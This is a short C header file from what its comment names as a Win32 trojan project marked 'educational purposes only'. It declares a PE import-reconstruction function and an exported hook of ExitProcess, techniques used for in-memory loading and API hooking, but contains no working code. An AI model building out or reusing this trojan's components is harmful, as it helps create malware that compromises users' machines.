/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/
#ifndef H_PE
#define H_PE


int __pe_imp_reconstruct(unsigned long hMemory);

#ifndef __TINYC__
	__declspec(dllexport) void __hook_ExitProcess(DWORD status);
#endif

#endif
